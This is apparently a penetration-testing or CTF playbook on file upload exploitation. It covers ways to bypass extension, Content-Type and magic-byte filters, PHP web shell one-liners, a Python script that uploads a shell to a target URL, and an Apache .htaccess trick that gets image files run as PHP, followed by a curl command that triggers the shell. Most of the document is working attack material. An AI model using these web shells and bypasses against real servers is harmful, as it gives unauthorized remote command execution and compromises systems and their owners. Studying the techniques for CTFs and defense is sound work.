# File Upload Exploits

## Purpose
Upload and execute malicious files (like web shells) on the target web server to compromise the system.

## Decision Tree
```
Is file type restricted?
 ├── Yes -> Attempt bypass:
 │    ├── Check Extension: Test alternative (php5, phtml, .phps) or double extensions (.jpg.php)
 │    ├── Check Content-Type: Intercept request and replace with image/jpeg
 │    └── Check Content Signature: Prepend GIF89a; magic bytes to shell payload
 └── No -> Upload direct shell (.php/.jsp/.asp) and request file route
```

## Recon Checklist
- [ ] Find image, avatar, or document uploads pages.
- [ ] Identify where uploaded files are stored (e.g. `/uploads/`, `/files/`).

## Detection Checklist
- [ ] Upload a harmless text file and see if it is accepted.
- [ ] Attempt to upload files containing various extensions and verify server errors.

## Recon Workflow
1. Intercept upload form action.
2. Note request structure: POST parameters, boundary formats, and headers.
3. Test file type filter rules.

## Enumeration
- Identify target script engine (PHP, ASPX, JSP, Python).
- Map file paths where uploads are stored.
- Test path traversal inside the filename parameter (e.g., `filename=../../shell.php`).

## Useful Tools
- Burp Suite (Repeater / Intruder)

## Quick Commands
*(Refer to PHP/Web shell payloads library)*

## Linux Commands
*(None applicable)*

## Common Payloads
```php
# PHP web shell snippet
<?php system($_GET['cmd']); ?>

# Short open tag PHP
<?= `$_GET[cmd]`; ?>
```

## Exploitation Workflow
1. Find upload endpoint and storage path.
2. Select appropriate shell format (matching backend language).
3. Bypass client/server validations (extension, Content-Type, Magic bytes).
4. Request the uploaded shell URL. Run commands.

## Example CTF Scenario
An avatar upload page rejects files ending in `.php`. The attacker intercepts the upload request in Burp, renames the file to `avatar.phtml`, changes `Content-Type` to `image/png`, and prepends PNG magic bytes. The file uploads successfully and can be executed via `/uploads/avatar.phtml?cmd=id`.

## Python Automation Example
```python
import requests
# Send file upload request programmatically
url = "http://target.com/upload.php"
files = {
    'file': ('shell.phtml', 'GIF89a;\n<?php system($_GET["cmd"]); ?>', 'image/gif')
}
r = requests.post(url, files=files)
if "uploaded" in r.text.lower():
    print("[+] File uploaded successfully! Verify execution path.")
```

## Common Mistakes
- Not matching the backend language (uploading a `.php` file to an IIS `.aspx` server).
- Uploading shells into directories that disable script execution (try path traversal to move them).

## CTF Tips
- Always check the `upload` response carefully; it might output the random name it renamed your file to.
- Look out for `.htaccess` upload exploits to change directory configs and enable custom file extensions.

## .htaccess-to-PHP (Apache upload bypass)
When the upload filter is a **blocklist** of only `.php`-ish extensions (`.php`, `.phtml`, `.phps`,
`.php5`) rather than a strict allowlist of images, and it permits a file named `.htaccess`:

1. Upload a `.htaccess` containing one of:
   ```
   AddType application/x-httpd-php .png
   # or
   <FilesMatch "\.png$">
   SetHandler application/x-httpd-php
   </FilesMatch>
   ```
2. Upload PHP code named with the allowed extension (e.g. `shell.png`):
   ```php
   <?php system($_GET['c']); ?>
   ```
3. Request it: `curl 'http://target/images/shell.png?c=cmd'`.

Key signals / workflow:
- Probe the filter FIRST: upload test files named `.txt`, `.php`, `.png`, `.phtml`, `.htaccess` and
  read the accept/reject responses to learn the rule (blocklist vs allowlist) and allowed extensions.
- No magic-byte/Content-Type validation needed here (server handler, not mime-type, now runs PHP).
- `SetHandler` is more reliable than `AddType` on Apache with php-fpm/mod_php variants.
- Read flags outside the web root: `../../flag.txt` (e.g. `ls ../..`, `cat ../../flag.txt`).

## References
- OWASP: Unrestricted File Upload
- HackTricks: File Upload
